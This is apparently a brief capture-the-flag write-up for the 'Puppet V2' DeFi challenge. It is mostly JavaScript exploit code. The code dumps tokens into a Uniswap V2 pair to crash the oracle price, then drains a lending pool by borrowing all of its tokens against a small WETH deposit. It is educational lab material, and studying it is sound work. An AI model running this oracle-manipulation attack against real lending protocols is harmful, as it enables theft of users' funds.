# Puppet V2

1. Quite same with Puppet challenge, but this time it use Uniswap V2 exhange as price oracle and use its library to compute the price. But the approach still quite the same.

```javascript
/** CODE YOUR EXPLOIT HERE */
// approve uniswapRouter to manage our token
await this.token
  .connect(attacker)
  .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
// swap our token to ETH
await this.uniswapRouter
  .connect(attacker)
  .swapExactTokensForETH(
    ATTACKER_INITIAL_TOKEN_BALANCE,
    1,
    [this.token.address, this.weth.address],
    attacker.address,
    (await ethers.provider.getBlock("latest")).timestamp * 2
  );
var balance = await ethers.provider.getBalance(attacker.address);
var required = await this.lendingPool.calculateDepositOfWETHRequired(
  POOL_INITIAL_TOKEN_BALANCE
);
// deposit to wETH the swapped ETH
await this.weth
  .connect(attacker)
  .deposit({ value: ethers.utils.parseEther("29.7") });
// then drain the pool
await this.weth
  .connect(attacker)
  .approve(this.lendingPool.address, ethers.utils.parseEther("30"));
await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
```
